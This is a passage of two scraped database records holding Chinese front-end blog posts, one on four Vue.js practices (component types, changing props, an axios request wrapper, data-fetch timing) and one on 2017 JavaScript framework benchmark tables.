{"_id":{"$oid":"5a4b76da2239bd131cd79f42"},"id":"5a3c73c2f265da4310488f20","author":{"$oid":"5a4b76d92239bd131cd79f35"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/22/1607d5d47b481aec?w=1202\u0026h=940\u0026f=png\u0026s=236701","https://user-gold-cdn.xitu.io/2017/12/22/1607d897d070780a?w=780\u0026h=542\u0026f=png\u0026s=35572","https://user-gold-cdn.xitu.io/2017/12/23/160812ea96ca6815?w=307\u0026h=599\u0026f=png\u0026s=18405"],"screenShot":null}],"title":"关于 vue 全家桶的四个 “最佳实践”","meta":{"likeCount":0},"tag":["Vue.js"],"comment":[],"shortContent":"对，就是它：Vue.js 组件编码规范。读过的同学忽略，没读过的同学有时间的话请花 20 分钟认真看看，文章的内容都是在认可这篇规范的基础上展开的。 另外，本文中的“最佳实践”（注意引号），全都是一家之言，不一定对，欢迎各路大佬讨论拍砖。 组件（component）是 vue …","content":"\u003ch1 class=\"heading\"\u003e前言\u003c/h1\u003e\n\u003cp\u003e在读这篇文章之前，我想先安利大家一个东西：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Vue.js 组件编码规范\" src=\"https://user-gold-cdn.xitu.io/2017/12/22/1607c25dec59cc58?w=463\u0026amp;h=463\u0026amp;f=png\u0026amp;s=30092\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e看到这副黑框眼镜，你是不是想到了什么？\u003c/p\u003e\n\u003cp\u003e对，就是它：\u003ca target=\"_blank\" href=\"https://github.com/pablohpsilva/vuejs-component-style-guide/blob/master/README-CN.md\"\u003eVue.js 组件编码规范\u003c/a\u003e。读过的同学忽略，没读过的同学有时间的话请花 20 分钟认真看看，文章的内容都是在认可这篇规范的基础上展开的。\u003c/p\u003e\n\u003cp\u003e另外，本文中的“最佳实践”（注意引号），全都是一家之言，不一定对，欢迎各路大佬讨论拍砖。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实践一：如何分类组件\u003c/h2\u003e\n\u003cp\u003e组件（component）是 vue 最核心的概念之一，但是正因为这一概念太过宽泛，我们会在实际开发中看到各种各样的组件，对开发和维护的同学带来了很大的困惑和混乱。这里我把组件分成四类：\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eview\u003c/h3\u003e\n\u003cp\u003e顾名思义，view 指的是页面，你也可以把它叫做 page。它的定义是：和具体的某一条路由对应，在 vue-router 配置中指定。view 是页面的容器，是其他组件的入口。它可以和 vuex store 通信，再把数据分发给普通组件。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eglobal component\u003c/h3\u003e\n\u003cp\u003e全局组件，作为小工具而存在。例如 toast、alert 等。他的特点是具备全局性，直接嵌套在 root 下，而不从属于哪个 view。global component 也和 vuex store 通信，它单独地使用 state 中的一个 module，这个 state 中的数据专门用来控制 gloabl component 的显隐和展示，不和其他业务实体用到的 state 混淆。\u003cbr\u003e\n其他组件想修改它，可以直接派发相应的 mutation。而要监听它的变化（比如一个全局的confirm，确认之后在不同的组件中触发不同的操作），则使用全局事件总线（event bus）。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003esimple component\u003c/h3\u003e\n\u003cp\u003e简单组件。这种组件对应的是 vue 中最传统的组件概念。它的交互和数据都不多，基本上就是起到一个简单展示，拆分父组件的作用。这种组件和父组件之间通过最传统的方式进行通讯：父组件将 props 传入它，而它通过 $emit 触发事件到父组件。\u003cbr\u003e\n简单组件内部是不写什么业务逻辑的，它可以说是生活不能自理，要展示什么就等着父组件传入，要干什么就 $emit 事件出去让父组件干，父组件够操心的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ecomplex component\u003c/h3\u003e\n\u003cp\u003e复杂组件。这种组件的特点是，内部包含有很多交互逻辑，常常需要访问接口。另外，展示的数据也往往比较多。如下图。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/22/1607d5d47b481aec?w=1202\u0026amp;h=940\u0026amp;f=png\u0026amp;s=236701\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n图中红框内部的就是一个复杂组件的实例。它是一个大列表的列表项，展示的数据很多，而且点击左下角的几个 button，还会弹出相应的弹窗，弹窗内有复杂的表单需要填写提交···逻辑可以说是相当复杂了。如果这时我们还拘泥于简单组件的那种通信方式，衣来伸手饭来张口，啥事儿不干，那么：\u003cbr\u003e\n1.所有的 props 都由父组件一一传入，如果有十几个乃至几十个要展示的数据，那么父组件 \u003ccode\u003e\u0026lt;template\u0026gt;\u003c/code\u003e 内的代码可不得上天了？\u003cbr\u003e\n2.所有的业务流程都要 $emit 出去要父组件处理，那么父组件 \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e 内的代码可不得上天了？\u003cbr\u003e\n所以，对于这种复杂组件，我们应该允许它有一定的“自主权”。可以跳过父组件，自行和 vuex 通信，获取一下 state，派发一下 mutation 和 action，不是很开心么。\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我画了一张图来说明上面这四种 component 的关系，希望能帮助大家更好理解。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/22/1607d897d070780a?w=780\u0026amp;h=542\u0026amp;f=png\u0026amp;s=35572\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在区分了这四种 component 后，我们在编码时就能做到心里有数，现在在写的组件，到底属于哪一类？每一类以特定的方式编写和交互，逻辑上就会清晰很多。\n使用 vue-cli 构建的项目中都会有一个目录叫做 component，以前是一股脑往里塞，现在可以在此基础上再设置几个子目录，放置不同类型的组件。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实践二：如何优雅地修改 props\u003c/h2\u003e\n\u003cp\u003e先来看一个栗子🌰\u003cbr\u003e\n假设有一个模态对话框的组件。父组件为了能够打开模态框，给模态框传入了一个控制其显隐的 props，命名为 visible，type 为 Boolean，绑定模态框外层的 v-if 指令。那么，问题来了，如果我们点击了模态框内部的关闭按钮，关闭自身，应该怎么写？\u003cbr\u003e\n当然，最传统的方式自然还是模态框抛出事件，父组件中设置监听，然后修改值。但这种方式无疑有很强的侵入性，无端增加了很多的代码量。关闭按钮在模态框内部，关闭自己是我自己的事儿，能不能不让父组件管这些？\u003cbr\u003e\n有同学说了，直接在模态框内部修改 visible 啊。\u003ccode\u003ethis.visible = false\u003c/code\u003e ，不行吗？\u003cbr\u003e\n还真不行。如果这么干，你会看到以下一堆报错：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e[Vue warn]: Avoid mutating a prop directly since the value will be overwritten whenever the parent component re-renders. Instead, use a data or computed property based on the prop's value.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003evue 很明确地告诉你了，作为子组件，你要安分守己，不许随便修改老爹传给你的 props。\u003cbr\u003e\n那么我们应该怎么办？\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e方法一\u003c/h3\u003e\n\u003cp\u003e我们思考一下，如果不允许修改 props 的值，那我们修改 porps 的······属性如何？\u003cbr\u003e\n事实证明，是可以的。\u003cbr\u003e\n我们可以把上面 visible 的 type 设为 Object，模态框的显隐决定于 visible.value。当模态框想要关闭自身时，只需 \u003ccode\u003ethis.visible.value = false\u003c/code\u003e 即可。\n这种方式看起来相当方便，但实际是一种投机取巧的方法。上面安利的 Vue.js 组件编码规范中明确有一条规范，就是 props 原子化，也就是说，props 里的字段必须是简单的 String，Number 或 Boolean。这么做的原因是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e使得组件 API 清晰直观。\u003c/li\u003e\n\u003cli\u003e只使用原始类型和函数作为 props 使得组件的 API 更接近于 HTML(5) 原生元素。\u003c/li\u003e\n\u003cli\u003e其它开发者更好的理解每一个 prop 的含义、作用。\u003c/li\u003e\n\u003cli\u003e传递过于复杂的对象使得我们不能够清楚的知道哪些属性或方法被自定义组件使用，这使得代码难以重构和维护。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e所以，我们把 visible 改为 Object，本来就是违反规范的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e方法二\u003c/h3\u003e\n\u003cp\u003evue 中有种已经存在的机制，和现有需求很像，这就是 v-model。在表单中，每一个 input，就像一个子组件。在外层通过 v-model 绑定的值可以在 input 中回显，而 input 本身的值也能改变。\u003cbr\u003e\n事实上，v-model 仅仅是一个语法糖，\u003ccode\u003ev-model=\"xxx\"\u003c/code\u003e,就相当于 \u003ccode\u003e:value=\"xxx\" @input=\"val=\u0026gt;xxx=val\"\u003c/code\u003e。那么，我们就可以利用 v-model 的这种特性来实现我们的需求。我们只需要在模态框内部抛出一个 input 事件 \u003ccode\u003ethis.$emit('input', false)\u003c/code\u003e,就能关闭自身了。\u003cbr\u003e\n这种方式比较简洁，也不违反规范，但是容易让人困惑，以为这里是要进行什么表单操作。\u003cbr\u003e\n我们还有没有什么更好的方式呢？\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e方法三\u003c/h3\u003e\n\u003cp\u003e如果你是从大版本为 1 时就开始接触 vue，那你可以知道一个修饰符，叫做.sync。如果你是从 2.0 开始接触的，则很可能不熟悉它。这是因为，vue 在 2.0 版本时把它删除了，不过好在， 2.3 版本之后，\u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/components.html#sync-%E4%BF%AE%E9%A5%B0%E7%AC%A6\"\u003e它又回来了\u003c/a\u003e。\u003cbr\u003e\n这个修饰符简直就是为我们这个需求量身定制的。它本身是一个和 v-model 类似的语法糖，我们要做的，仅仅是在组件内部需要改动值的地方，抛出一个 update 事件。\u003ccode\u003ethis.$emit('update:foo', newValue)\u003c/code\u003e。既不违反规范，也足够清晰，可以说是最佳的解决方案了。唯一的不足之处，就是对版本有一点要求。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实践三：如何封装请求接口\u003c/h2\u003e\n\u003cp\u003e数据是 SPA 的核心，而数据的来源都是接口。如何优雅、高效地通过接口请求数据，是开发者必须要关心的问题。在实践中，我是这样封装接口的：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/23/160812ea96ca6815?w=307\u0026amp;h=599\u0026amp;f=png\u0026amp;s=18405\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n从高层到底层，依次说明。\u003cbr\u003e\n第一层就是组件。\u003cbr\u003e\n第二层则是 vuex 中的 action，我们在组件中调用 action，基本操作。\u003cbr\u003e\n第三层是 api。在这里，我们预先定义了每一个接口。包括接口的 url、type、content-type，以及写死的请求参数。在 action 中，我们调用 api 请求接口。\u003cbr\u003e\n第四层是 request，这是我们请求的公共方法，作用就是对特定的 http client。   进行封装，实现一套统一的接口请求——处理流程。\u003cbr\u003e\n第五层则是以 axios 为代表的各种 http client。\u003cbr\u003e\n我们主要进行编码的是第三层和第四层，也就是 api 和 request。api 的编写没有什么难点，主要谈谈 request 的代码。这部分代码，我们要关心以下几个方面。\u003cp\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eloading 处理。当请求时间比较长时，要跳出全局的 loading 让用户知晓。\u003c/li\u003e\n\u003cli\u003e错误处理。有两种错误，第一种是 http 请求直接返回错误码。第二种，虽然请求的返回值是 200，但是返回结果中提示错误。比如返回的 json 中 \u003ccode\u003esuccess: false\u003c/code\u003e。对于这两种错误，我们都要捕获并处理。\u003c/li\u003e\n\u003cli\u003eapi 一致性处理。http client 接受的参数是有讲究的，以 axios为例，get 请求的请求参数为 params，而 post 请求的参数则为 data。对于这种差异，request 这层需要将其抹平，api 层不需要在定义接口时关心这些。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e下面是示例代码，可供参考。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (opt.method === \u003cspan class=\"hljs-string\"\u003e'post'\u003c/span\u003e) {\n    axiosOpt.data = opt.payload\n  } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (opt.method === \u003cspan class=\"hljs-string\"\u003e'get'\u003c/span\u003e) {\n    axiosOpt.params = opt.payload\n  }\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (opt.withFile) {\n    Object.assign(axiosOpt, { headers: {\n      \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'multipart/form-data'\u003c/span\u003e\n    }})\n  }\n\n  // 全局请求的 loading，当请求 300 ms 后还没返回，才会出现 loading\n  const timer = \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(() =\u0026gt; {\n    store.dispatch(\u003cspan class=\"hljs-string\"\u003e'showLoading'\u003c/span\u003e, {\n      text: \u003cspan class=\"hljs-string\"\u003e'加载数据中'\u003c/span\u003e\n    })\n  }, 300)\n\n  try {\n    // 开始请求\n    const result = await axios(axiosOpt)\n    // 如果 300 ms 还没到，就取消定时器\n    clearTimeout(timer)\n    store.dispatch(\u003cspan class=\"hljs-string\"\u003e'closeLoading'\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (result.status === 200 \u0026amp;\u0026amp; result.statusText === \u003cspan class=\"hljs-string\"\u003e'OK'\u003c/span\u003e) {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (result.data.success) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e result.data.results || \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n      } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        // 请求失败的 toast\n        store.dispatch(\u003cspan class=\"hljs-string\"\u003e'showAlert'\u003c/span\u003e, {\n          \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'error'\u003c/span\u003e,\n          text: `请求失败\u003cspan class=\"hljs-variable\"\u003e${result.data.message ? `,信息：${result.data.message}\u003c/span\u003e`: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e}`\n        })\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n      }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    }\n  } catch(e) {\n    clearInterval(timer)\n    // 请求失败的 toast\n    store.dispatch(\u003cspan class=\"hljs-string\"\u003e'closeLoading'\u003c/span\u003e)\n    store.dispatch(\u003cspan class=\"hljs-string\"\u003e'showAlert'\u003c/span\u003e, {\n      \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'error'\u003c/span\u003e,\n      text: \u003cspan class=\"hljs-string\"\u003e'请求失败'\u003c/span\u003e\n    })\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e实践四：如何决定请求数据的时机\u003c/h2\u003e\n\u003cp\u003eSPA中，每一个 view 中的都有很多数据是需要通过接口请求获得的，如果没有获得，页面中就会有很多空白。上面，我们讨论了如何封装好接口请求，下一步就是决定什么时候请求初始化数据，即，代码在哪里写的问题。实践下来，有两个时机是比较理想的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ebeforeRouteEnter/Update\u003c/h3\u003e\n\u003cp\u003evue-router 提供了以上两个生命周期钩子，分别会在进入路由和路由改变时触发。这两个钩子是写的 view 中的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003erouter.beforeEach\u003c/h3\u003e\n\u003cp\u003evue-router还提供了一个全局性的 beforeEach 方法，任何一个路由改变时，都会被这个方法拦截，我们可以在这个方法中加入我们自己的代码，做统一处理。比如，对于所有 view 初始化请求的 action，我们可以以特定的名称命名，如以 _init 作为后缀等。在 beforeEach 方法内，我们对当前 view 对应的 store 进行监听，查找到其中以 _init 命名的 action 并派发。\u003cbr\u003e\n以上两种方式各有特点。\u003cbr\u003e\n对于前者，优点是数据获取的代码和具体的 view 是绑定在一起的，我们可以在 view 内部就清晰地看到数据获取的流程。缺点是，每增加一个页面，都要在其内部写一堆初始化代码，增加了代码量。\n对于后者。优点是，代码统一且规整，使用了配置的方式，写一次即可，不需要每次增加额外的代码。缺点是比较隐晦，且初始化代码和 view 本身割裂了。\u003cbr\u003e\n对于以上两种方式如何取舍的问题，我倾向于，大型项目用后者，小型项目用前者。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eOther Tips\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e多使用 mixing，能够在组件级别抽离公共部分，减少冗余，极好的机制。\u003c/li\u003e\n\u003cli\u003e多使用常量，这点和 vue 本身没有关系，但是能极大地提升代码的健壮性。\u003c/li\u003e\n\u003cli\u003e链接如果是在项目内部跳转，多使用 ，而不是去拼 a 标签的 href。\u003c/li\u003e\n\u003cli\u003e不要用 dom 操作。但如果迫不得已，比如你要获得某个 dom 的 scrollTop 属性，用 $ref,而不是用选择器去取。\u003c/li\u003e\n\u003cli\u003e能想到的就这些，欢迎大佬们讨论补充。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e作者：丁香园前端团队-㍿社长\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514890228.2114","__v":0}
{"_id":{"$oid":"5a4b76da2239bd131cd79f44"},"id":"5a40bf81f265da432b4b0d67","author":{"$oid":"5a4b76d92239bd131cd79f30"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/25/1608da88a7546601?w=1675\u0026h=873\u0026f=png\u0026s=53634","https://user-gold-cdn.xitu.io/2017/12/25/1608dac5693d87d4?w=767\u0026h=575\u0026f=png\u0026s=26145","https://user-gold-cdn.xitu.io/2017/12/25/1608dac9b46bd235?w=752\u0026h=452\u0026f=png\u0026s=24591","https://user-gold-cdn.xitu.io/2017/12/25/1608dae98ae157e3?w=866\u0026h=452\u0026f=png\u0026s=26301"],"screenShot":null}],"title":" 2017 JavaScript 主流框架性能总结 ","meta":{"likeCount":0},"tag":["Angular.js","React.js","Vue.js","JavaScript","前端框架"],"comment":[],"shortContent":"作为一名JavaScript开发者，你也许已经接触到了众多框架，甚至在众多框架之中你已经熟练掌握了一两个。之前我偏爱框架，它降低了我的开发难度。但是在经历了那么多优秀的前端的概念变革，从Virtual-DOM到状态管理，我也在想，对于框架的本身，它们的性能到底如何，对于不同类型…","content":"\u003cblockquote\u003e\n\u003cp\u003eupdate: 更新了图表\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e前言\u003c/h3\u003e\n\u003cp\u003e作为一名JavaScript开发者，你也许已经接触到了众多框架，甚至在众多框架之中你已经熟练掌握了一两个。之前我偏爱框架，它降低了我的开发难度。但是在经历了那么多优秀的前端的概念变革，从Virtual-DOM到状态管理，我也在想，对于框架的本身，它们的性能到底如何，对于不同类型的操作的开销又是怎样的，本文将对主流框架进行性能比对，并且总结之间的性能差异。\u003c/p\u003e\n\u003cp\u003e使用环境：MacBook Pro 15 (2,5 GHz i7, 16 GB RAM, OSX 10.13.1, Chrome 62.0.3202.94 (64-bit))\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e将要上场的框架们\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003evanillajs - 主神的存在，无处不在，无所不能的框架，大量运用于各种主流网站的开发\u003c/li\u003e\n\u003cli\u003ereact - 脸书的儿子，对外一直宣称自己的没满岁，在大家认为它没希望长到一岁的时候，一下子长到了十五岁\u003c/li\u003e\n\u003cli\u003eangularJS - 谷歌爸爸的长子，虽然还在维护，但是因为弟弟们的诞生，热度大不如前\u003c/li\u003e\n\u003cli\u003eangular - 谷歌爸爸在生了长子后，觉得这届儿子不行，我要再造几个，现在编号第五的老四刚刚诞生\u003c/li\u003e\n\u003cli\u003evue - \u003cs\u003e来自东方的神秘力量\u003c/s\u003e，框架的后起之秀，不过总是会和以上的框架们比较，构成了前端娱乐圈主要戏码\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e在使用KEY的情况下\u003c/h3\u003e\n\u003cp\u003e把DOM元素和数据联系的时候，数据变化，key也会更新。\u003c/p\u003e\n\u003cp\u003e（数据表示：平均ms±偏差ms(相对于最快的倍数)）\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e测试项目\u003c/th\u003e\n\u003cth\u003evanillajs\u003c/th\u003e\n\u003cth\u003evue-v2.5.3\u003c/th\u003e\n\u003cth\u003eangular-v5.0.0\u003c/th\u003e\n\u003cth\u003ereact-v16.1.0\u003c/th\u003e\n\u003cth\u003eangular-v1.6.3\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e创建行\u003c/strong\u003e：\u003cbr\u003e在页面载入之后创建1000行内容。\u003c/td\u003e\n\u003ctd\u003e137.8±9.9(1.0)\u003c/td\u003e\n\u003ctd\u003e169.2±3.6(1.2)\u003c/td\u003e\n\u003ctd\u003e185.7±7.8(1.3)\u003c/td\u003e\n\u003ctd\u003e201.2±12.1(1.5)\u003c/td\u003e\n\u003ctd\u003e222.9±8.1(1.6)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e更新行\u003c/strong\u003e：\u003cbr\u003e更新所有1000行的内容。\u003c/td\u003e\n\u003ctd\u003e155.7±5.4(1.0)\u003c/td\u003e\n\u003ctd\u003e161.8±3.9(1.0)\u003c/td\u003e\n\u003ctd\u003e179.3±6.5(1.2)\u003c/td\u003e\n\u003ctd\u003e169.0±4.3(1.1)\u003c/td\u003e\n\u003ctd\u003e232.3±8.7(1.5)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e部分更新\u003c/strong\u003e：\u003cbr\u003e更新一万行的表格中十的倍数行的内容\u003c/td\u003e\n\u003ctd\u003e76.5±4.8(1.0)\u003c/td\u003e\n\u003ctd\u003e168.1±7.4(2.3)\u003c/td\u003e\n\u003ctd\u003e73.5±4.9(1.0)\u003c/td\u003e\n\u003ctd\u003e90.9±3.3(1.2)\u003c/td\u003e\n\u003ctd\u003e87.1±5.3(1.2)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e选择行\u003c/strong\u003e：\u003cbr\u003e鼠标点击一行高亮的时间\u003c/td\u003e\n\u003ctd\u003e10.8±3.5(1.0)\u003c/td\u003e\n\u003ctd\u003e9.8±2.5(1.0)\u003c/td\u003e\n\u003ctd\u003e7.6±4.0(1.0)\u003c/td\u003e\n\u003ctd\u003e12.4±4.1(1.0)\u003c/td\u003e\n\u003ctd\u003e10.0±4.7(1.0)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e交换行\u003c/strong\u003e：\u003cbr\u003e交换一千行的表格中的两行\u003c/td\u003e\n\u003ctd\u003e18.3±4.6(1.0)\u003c/td\u003e\n\u003ctd\u003e19.0±2.8(1.0)\u003c/td\u003e\n\u003ctd\u003e118.5±2.8(6.5)\u003c/td\u003e\n\u003ctd\u003e121.8±4.2(6.7)\u003c/td\u003e\n\u003ctd\u003e125.9±5.3(6.9)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e删除行\u003c/strong\u003e：\u003cbr\u003e删除一行内容\u003c/td\u003e\n\u003ctd\u003e43.1±1.6(1.0)\u003c/td\u003e\n\u003ctd\u003e52.5±1.8(1.2)\u003c/td\u003e\n\u003ctd\u003e46.1±2.6(1.1)\u003c/td\u003e\n\u003ctd\u003e51.5±2.0(1.2)\u003c/td\u003e\n\u003ctd\u003e48.6±2.5(1.1)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e创建多行\u003c/strong\u003e：\u003cbr\u003e创建10000行内容\u003c/td\u003e\n\u003ctd\u003e1,374.5±33.3(1.0)\u003c/td\u003e\n\u003ctd\u003e1,521.4±55.7(1.1)\u003c/td\u003e\n\u003ctd\u003e1,682.0±53.1(1.2)\u003c/td\u003e\n\u003ctd\u003e2,033.7±32.0(1.5)\u003c/td\u003e\n\u003ctd\u003e2,112.0±77.7(1.5)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e附加行\u003c/strong\u003e：\u003cbr\u003e在10000行的表格后附加上1000行\u003c/td\u003e\n\u003ctd\u003e217.4±7.3(1.0)\u003c/td\u003e\n\u003ctd\u003e338.4±10.3(1.6)\u003c/td\u003e\n\u003ctd\u003e257.6±11.1(1.2)\u003c/td\u003e\n\u003ctd\u003e271.8±9.9(1.3)\u003c/td\u003e\n\u003ctd\u003e371.6±60.4(1.7)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e清空行\u003c/strong\u003e：\u003cbr\u003e清空一万行的表格的内容\u003c/td\u003e\n\u003ctd\u003e177.1±10.2(1.0)\u003c/td\u003e\n\u003ctd\u003e240.9±11.4(1.4)\u003c/td\u003e\n\u003ctd\u003e360.3±16.4(2.0)\u003c/td\u003e\n\u003ctd\u003e224.4±6.0(1.3)\u003c/td\u003e\n\u003ctd\u003e517.8±62.0(2.9)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608da88a7546601?w=1675\u0026amp;h=873\u0026amp;f=png\u0026amp;s=53634\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n在开销比较大的表格操作上，交换行的开销是各个框架的重灾区，但是因为底层diff算法深度不同的关系，vue在此项表现上比较好，在事件处理机制上，框架表现出了对于事件的优化，而react因为大量附加事件逻辑的关系，表现略逊一筹。总的操作性能比上，以vanillajs为基准，依次为vue(1.27)，angularJS(1.47)，react(1.49)，angular(1.77)。\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e启动时间\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e测试项目\u003c/th\u003e\n\u003cth\u003evanillajs\u003c/th\u003e\n\u003cth\u003evue-v2.5.3\u003c/th\u003e\n\u003cth\u003eangular-v5.0.0\u003c/th\u003e\n\u003cth\u003ereact-v16.1.0\u003c/th\u003e\n\u003cth\u003eangular-v1.6.3\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e当CPU和网络情况都很空闲的时候的启动时间\u003c/td\u003e\n\u003ctd\u003e38.8±2.9(1.0)\u003c/td\u003e\n\u003ctd\u003e55.4±1.6(1.4)\u003c/td\u003e\n\u003ctd\u003e97.4±3.5(2.5)\u003c/td\u003e\n\u003ctd\u003e58.4±1.1(1.5)\u003c/td\u003e\n\u003ctd\u003e96.9±23.9(2.5)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e载入框架所有脚本所需要的时间\u003c/td\u003e\n\u003ctd\u003e4.0±0.3(1.0)\u003c/td\u003e\n\u003ctd\u003e20.8±0.7(1.3)\u003c/td\u003e\n\u003ctd\u003e45.9±1.6(2.9)\u003c/td\u003e\n\u003ctd\u003e22.1±0.6(1.4)\u003c/td\u003e\n\u003ctd\u003e56.8±18.4(3.6)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e主线程（样式,布局等)的花销时间\u003c/td\u003e\n\u003ctd\u003e162.1±2.6(1.0)\u003c/td\u003e\n\u003ctd\u003e174.2±2.5(1.1)\u003c/td\u003e\n\u003ctd\u003e216.8±4.6(1.3)\u003c/td\u003e\n\u003ctd\u003e176.9±2.3(1.1)\u003c/td\u003e\n\u003ctd\u003e224.0±52.1(1.4)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e经过网络传输所有资源的总大小（byte）\u003c/td\u003e\n\u003ctd\u003e163,967.0(1.0)\u003c/td\u003e\n\u003ctd\u003e227,410.0(1.4)\u003c/td\u003e\n\u003ctd\u003e304,139.0(1.9)\u003c/td\u003e\n\u003ctd\u003e263,076.0(1.6)\u003c/td\u003e\n\u003ctd\u003e337,157.0(2.1)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg 